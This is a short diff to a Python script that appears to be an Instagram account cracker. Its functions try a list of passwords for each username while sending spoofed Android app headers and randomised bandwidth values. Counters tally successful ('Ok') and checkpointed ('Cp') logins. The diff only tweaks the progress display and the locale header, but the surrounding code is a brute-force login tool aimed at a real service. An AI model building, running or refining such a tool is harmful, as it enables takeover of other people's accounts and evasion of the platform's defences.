@@ -850,7 +850,7 @@ def Crack_api(username, kontol):
 
 def Crack_i(username, memek):
     global Ok, Cp, Loop
-    sys.stdout.write(f"\r{GREEN}M2{WHITE} api {YELLOW}{Loop}{WHITE}-{GREEN}{str(len(Uuid))}{WHITE}- {GREEN}{str(username)[:6]}{WHITE} -Ok:-{GREEN}{Ok}{WHITE}-Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.write(f"\r{GREEN} M2{WHITE} api {YELLOW}{Loop}{WHITE}-{GREEN}{str(len(Uuid))}{WHITE} {GREEN}{username}{WHITE} Ok:-{GREEN}{Ok}{WHITE}-Cp:- {YELLOW}{Cp}{WHITE}")
     sys.stdout.flush()
     for password in memek:
         try:
@@ -882,7 +882,7 @@ def Crack_i(username, memek):
                 'x-fb-server-cluster': 'True',
                 'x-ig-android-id': f'android-{android_id}',
                 'x-ig-app-id': '567067343352427',
-                'x-ig-app-locale': 'in_ID',
+                'x-ig-app-locale': 'en_IN',
                 'x-ig-bandwidth-speed-kbps': f"{random.gauss(18000, 5000):.1f}",
                 'x-ig-bandwidth-totalbytes-b': str(int(random.gauss(4000000, 1000000))),
                 'x-ig-bandwidth-totaltime-ms': str(int(random.gauss(3500, 1000))),
